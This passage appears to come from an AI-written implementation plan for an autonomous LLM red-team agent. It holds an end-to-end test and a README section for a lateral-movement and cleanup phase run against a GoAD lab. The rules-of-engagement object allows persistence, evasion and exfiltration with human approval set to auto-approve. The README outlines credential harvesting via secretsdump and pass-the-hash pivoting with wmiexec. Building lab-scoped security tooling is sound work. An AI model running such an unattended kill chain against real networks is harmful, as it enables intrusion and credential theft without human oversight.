- [ ] **Step 4: Iterate until the test passes**

Run: `uv run pytest tests/integration/test_phase5_pipeline.py -v` → 1 PASS.
Run full suite `uv run pytest -q` → **311 passed, 4 skipped**.

- [ ] **Step 5: Commit**

```bash
git add tests/integration/test_phase5_pipeline.py tests/fixtures_paths.py
git commit -m "test: add Phase 5 integration test for full lateral+cleanup pipeline"
```

---

## Task 15: E2E Test — GoAD Multi-Host + README

**Files:**
- Create: `tests/e2e/test_phase5_goad_multihost.py`
- Modify: `README.md` (new "Phase 5 E2E Test (GoAD, Multi-Host)" section)

**Interfaces:**
- Consumes: `build_phase5_graph` (Task 13), real LLM (Anthropic + DeepSeek keys), real tools (`msfrpcd`, impacket, crackmapexec), live GoAD lab.
- Produces: the spec §13.5 ship-criteria E2E — full chain across 2+ hosts, sub-engagement linkage, cleanup verified, no artifacts remaining.

Design: `target_scope` covers **two** GoAD hosts (primary `192.168.56.22` SRV02, pivot target `192.168.56.11` — override via `AUTORED_GOAD_TARGET` / `AUTORED_GOAD_PIVOT_TARGET`). Recon discovers both; the Exploit Agent footholds the weaker one (rank-1 hypothesis); the Lateral Agent pivots the harvested administrator hash onto the other; the sub-engagement runs the full Phase 4 chain against it; the Cleanup Agent removes + verifies every artifact on both hosts.

- [ ] **Step 1: Write the E2E test**

```python
# tests/e2e/test_phase5_goad_multihost.py
"""E2E: full Phase 5 kill chain (lateral + cleanup) against GoAD, multi-host.

Spec §13.5 ship criteria:
  * full chain across 2+ hosts
  * sub-engagement state correctly linked to parent
  * cleanup removes all artifacts, verifiable via re-scan
  * no artifacts remain after cleanup

Skipped unless AUTORED_E2E=1 (same gate as the Phase 1-4 E2E tests).

Prerequisites (beyond Phase 4's):
  * GoAD lab running locally (both target VMs reachable)
  * msfrpcd running (Phase 3 setup)
  * impacket + crackmapexec on $PATH (Kali defaults)
  * ANTHROPIC_API_KEY + DEEPSEEK_API_KEY
  * AUTORED_LHOST (VirtualBox host-only IP)

Expected runtime: 60-90 minutes (two hosts, sub-engagement included).
"""
import asyncio
import os

import pytest

pytestmark = pytest.mark.skipif(
    os.environ.get("AUTORED_E2E") != "1",
    reason="E2E tests run only with AUTORED_E2E=1 (live GoAD lab required)",
)


def test_phase5_goad_multihost():
    # Lazy imports so collection-time skip stays fast.
    from autored.state import EngagementState
    from autored.models.roe import RulesOfEngagement
    from autored.persistence.filesystem import (
        init_engagement_folder,
        save_state_to_disk,
    )
    from autored.persistence.sqlite_saver import make_checkpointer
    from autored.graph import build_phase5_graph
    from autored.roe_guard import register_roe
    from autored.tui.event_bus import EventBus

    primary = os.environ.get("AUTORED_GOAD_TARGET", "192.168.56.22")
    pivot_target = os.environ.get("AUTORED_GOAD_PIVOT_TARGET", "192.168.56.11")
    lhost = os.environ.get("AUTORED_LHOST")
    assert lhost, "AUTORED_LHOST must be set (VirtualBox host-only IP)"
    engagement_id = f"p5-goad-{primary.split('.')[-1]}-{pivot_target.split('.')[-1]}"

    roe = RulesOfEngagement(
        engagement_name="GoAD Phase 5 E2E", operator="operator",
        operator_signature="sandbox-mode",
        allowed_ips=[f"192.168.56.0/24"], allowed_techniques=["*"],
        persistence_allowed=True, evasion_allowed=True,
        exfiltration_allowed=True, kernel_exploits_allowed=True,
        hitl_mode="auto_approve",
    )
    register_roe(engagement_id, roe)
    init_engagement_folder(engagement_id, f"{primary},{pivot_target}", "operator")

    state = EngagementState(
        engagement_id=engagement_id,
        target_scope=[primary, pivot_target],
        operator="operator",
        rules_of_engagement=roe,
    )
    state.event_bus = EventBus()

    async def _run():
        checkpointer = await make_checkpointer(engagement_id)
        graph = build_phase5_graph(checkpointer)
        config = {"configurable": {"thread_id": engagement_id}}
        try:
            return await asyncio.wait_for(
                graph.ainvoke(state, config=config), timeout=5400,
            )  # 90 minutes — two hosts + sub-engagement
        finally:
            conn = getattr(checkpointer, "conn", None)
            if conn is not None:
                await conn.close()

    final = asyncio.run(_run())
    if isinstance(final, dict):
        from autored.state import EngagementState as ES
        final_state = ES.model_validate(final)
    else:
        final_state = final
    save_state_to_disk(engagement_id, final_state)

    # ---- spec §13.5 ship criteria ----
    # 1. Full chain across 2+ hosts
    assert len(final_state.hosts) >= 2, (
        f"expected >=2 hosts, got {[h.ip for h in final_state.hosts]}"
    )
    assert len(final_state.footholds) >= 1
    assert len(final_state.pivots) >= 1, "no lateral pivot was executed"
    assert final_state.pivots[0].success is True

    # 2. Sub-engagement linked to parent
    assert len(final_state.sub_engagements) >= 1
    ref = final_state.sub_engagements[0]
    assert ref.status in ("completed", "failed")
    assert ref.sub_id.startswith(engagement_id)
    assert os.path.exists(ref.sub_state_path), (
        f"sub-engagement state not persisted at {ref.sub_state_path}"
    )

    # 3+4. Cleanup removed + verified every artifact; none remain
    if final_state.persistence_artifacts:
        artifact_ids = {a.id for a in final_state.persistence_artifacts}
        verification = [
            r for r in final_state.cleanup_results
            if r.artifact_id in artifact_ids and r.verified
        ]
        unverified = [
            r for r in final_state.cleanup_results
            if r.artifact_id in artifact_ids and not r.verified
        ]
        assert len(verification) >= len(artifact_ids), (
            f"not every artifact verified removed: "
            f"verified={len(verification)}, artifacts={len(artifact_ids)}"
        )
        assert not unverified, (
            f"unverified cleanups remain: "
            f"{[(r.artifact_id, r.error) for r in unverified]}"
        )

    assert final_state.phase == "done"

    print(f"\n[Phase 5 E2E] pivots: {len(final_state.pivots)}")
    for p in final_state.pivots:
        print(f"  pivot -> {p.target_host} via {p.method} (success={p.success})")
    for se in final_state.sub_engagements:
        print(f"  sub-engagement {se.sub_id}: {se.status}")
    print(f"[Phase 5 E2E] cleanup results: {len(final_state.cleanup_results)} "
          f"(all verified: "
          f"{all(r.verified for r in final_state.cleanup_results)})")
```

- [ ] **Step 2: Verify it's skipped by default**

Run: `uv run pytest tests/e2e/ -v` → 5 SKIPPED (Phase 1/2/3/4/5 E2E tests all gated on `AUTORED_E2E=1`).

- [ ] **Step 3: Add the README section**

Append to `README.md` (after the Phase 4 section), mirroring its structure — prerequisites (GoAD with **two** reachable VMs, msfrpcd, impacket + crackmapexec on PATH), run instructions:

```markdown
## Phase 5 E2E Test (GoAD, Multi-Host)

Phase 5 adds the Lateral Agent (pivot + sub-engagement recursion) and
the Cleanup Agent (artifact removal + verification). The Phase 5 E2E
test runs the full chain — recon → vuln → exploit → post-ex → lateral
→ cleanup — against **two** GoAD hosts and asserts the engagement
pivots onto the second host, spawns a linked sub-engagement, and
leaves zero artifacts behind.

### Prerequisites

In addition to the Phase 4 prerequisites:

1. **A second reachable GoAD VM** — the test pivots from the primary
   target (default `192.168.56.22` / SRV02) to a second host
   (default `192.168.56.11`). Override with `AUTORED_GOAD_TARGET` and
   `AUTORED_GOAD_PIVOT_TARGET`.
2. **`crackmapexec` on your `$PATH`** (Kali default; if you only have
   `netexec`, symlink it: `ln -s $(which netexec) /usr/local/bin/crackmapexec`).
3. **Working domain credentials are NOT pre-seeded** — the chain
   harvests them itself: exploit → foothold → post-ex secretsdump →
   administrator hash → pivot.

### Run the Phase 5 E2E test

```bash
# 1. Bring up GoAD (two+ VMs), verify both targets are reachable
ping 192.168.56.22 && ping 192.168.56.11

# 2. Start msfrpcd (see Phase 3 section)
msfrpcd -P msf -p 55553 -a 127.0.0.1 -U msf -L

# 3. Set env vars
export ANTHROPIC_API_KEY=sk-ant-...
export DEEPSEEK_API_KEY=sk-...
export AUTORED_E2E=1
export AUTORED_LHOST=192.168.56.1
export AUTORED_GOAD_TARGET=192.168.56.22
export AUTORED_GOAD_PIVOT_TARGET=192.168.56.11

# 4. Run (60-90 minutes — two hosts + a sub-engagement)
uv run pytest tests/e2e/test_phase5_goad_multihost.py -v -s
```

The test passes if:

- Recon discovers ≥ 2 hosts (both scope targets)
- The Exploit Agent records ≥ 1 foothold
- The Lateral Agent executes ≥ 1 **successful** pivot onto the second
  host (harvested administrator hash via wmiexec pass-the-hash)
- A sub-engagement runs against the pivot target and its `state.json`
  is persisted and linked from the parent state
- The Cleanup Agent removes and **verifies** every persistence
  artifact (zero unverified cleanups)
- The Phase 5 graph reaches the `done` phase

### Troubleshooting

- **`no lateral pivot was executed`** — either both hosts got direct
  footholds in the exploit phase (leaving no un-footholded pivot
  target — re-run, or pin the Vuln Agent toward the weaker host), or
  post-ex failed to harvest a username-bearing credential (check
  `harvested_secrets` in `state.json` — secrets need
  `secretsdump:.../<username>`-style sources).
- **`pivot success=False`** — crackmapexec/wmiexec auth failed: the
  harvested hash doesn't have admin rights on the pivot target. Try a
  different pivot target VM.
- **unverified cleanups** — inspect `cleanup_results` in `state.json`:
  each unverified entry carries the exact verify command and output;
  run it manually to see what remains.
```

- [ ] **Step 4: Commit**

```bash
git add tests/e2e/test_phase5_goad_multihost.py README.md
git commit -m "test: add Phase 5 E2E test against GoAD multi-host with cleanup verification"
```

---

## Self-Review

(After writing this plan, verify spec coverage, placeholders, type consistency, and Review Focus coverage. Findings recorded below.)

**1. Spec coverage** — §1.2 Phase 5 row (Lateral + Cleanup) → Tasks 11-12; §6.5 Lateral Agent → Task 11 (`_identify_pivot_candidates`, per-pivot HitL, `_execute_pivot` via PivotExecutor, optional tunnel, sub-engagement spawn, state writes verbatim); §6.6 Cleanup Agent → Task 12 (collect → plan → gate → execute → verify, `cleanup_results` append semantics per spec); §7.4 sub-agents → Tasks 6-9 (PivotExecutor, TunnelSetup, ArtifactRemover, VerificationScanner — all four at the spec'd file paths); §5.3 Phase 5 tools → Tasks 2-4 (impacket_wmiexec + psexec/smbexec, crackmapexec, ligolo_connect + chisel); §9.2 models → Task 1 (PivotRecord/SubEngagementRef/MovementPath/CleanupResult verbatim, TunnelConfig + teardown_command deviation documented, PivotCandidate new-but-implied); §9.1 state fields → Task 1 (pivots/tunnels/sub_engagements/movement_paths/cleanup_results); §13.5 ship criteria → Task 15 (E2E: 2+ hosts, linked sub-engagement, verified cleanup, no artifacts remaining); §2.3 graph topology → Task 13 (documented EventBus-over-interrupt deviation, consistent with Phases 3-4); RoE categories lateral/tunnel/cleanup → Task 1. **Gap accepted:** spec's `impacket_wmiexec` only lists wmiexec in the tool table — psexec/smbexec ship alongside (PivotRecord.method Literal requires them); `ssh`/`winrm`/`certipy` pivot methods remain record-only (need the Phase 6 session manager), documented in Task 11.

**2. Placeholder scan** — no TBDs; every code step carries full source; Task 14's `_enter_phase4_mocks` / `_postex_payload` are explicitly delegated to verbatim copies from `test_phase4_pipeline.py` with the delegation rule stated (pipeline file wins on conflict, assertions stay verbatim) — this mirrors the Phase 4 plan's accepted pattern of referencing established test fixtures rather than duplicating 150 lines of mock lattice.

**3. Type consistency** — `PivotExecutorOutput(pivot, success, output)` used identically in Tasks 6/11; `HostCleanupPlan(transport, username, password, nthash)` field names match across Tasks 1/8/9/12; `CleanupResult(artifact_id, host_ip, removal_command, success, verified, error, timestamp)` consistent across Tasks 1/8/9/12; `spawn_sub_engagement(parent_state, sub_id, target_host, pivot_method, credentials)` identical in Tasks 10/11; `_build_impacket_cmd` shared by Tasks 2/5; patch targets all use the `autored.agents.<module>.<alias>` convention proven by `test_postex_agent.py`.

**4. Review Focus coverage** — #1 (out-of-scope pivot) → Task 11 `test_out_of_scope_target_skipped_before_hitl`; #2 (failed pivot continues) → Task 11 `test_failed_pivot_tries_next_candidate`; #3 (recursion cap) → Task 10 `test_depth_cap_raises_from_sub_state` + Task 11 `test_depth_cap_error_skips_sub_engagement` + Task 13 `test_phase5_graph_does_not_recurse_into_sub_engagements`; #4 (cleanup rejection) → Task 12 `test_gate_rejection_executes_nothing`; #5 (failed removal visible) → Task 8 `test_failed_removal_recorded_with_error`, Task 9 `test_artifact_still_present_marks_unverified_with_error`, Task 12 `test_failed_removal_visible_in_results`.

**5. Test-count arithmetic** — 227 existing + T1:18 + T2:8 + T3:7 + T4:5 + T5:10 + T6:4 + T7:2 + T8:3 + T9:3 + T10:2 + T11:11 + T12:7 + T13:3 + T14:1 = 311 passing, 4 skipped (+1 new E2E skipped → 5 skipped after Task 15).

---

## Execution Handoff

Plan complete and saved to `docs/superpowers/plans/2026-09-22-autored-phase5-lateral-cleanup.md`. Please review the plan. Which execution approach would you prefer?

- **Subagent-driven** (recommended) — fresh subagent per task, reviewer verifies, next task starts.
- **Native** — I implement all tasks myself.

**For this plan I recommend Subagent-driven**, same as Phases 1-4. Likely failure points: the Task 14 mock lattice (30+ patches past Python's `with` nesting limit — ExitStack mandatory), the graph-level patch targets in Task 10 (dual-import trap), pivot-candidate username parsing against real CredHarvester sources, and the cleanup verify-command grammar matching actual Windows `schtasks /query` / `reg query` output.
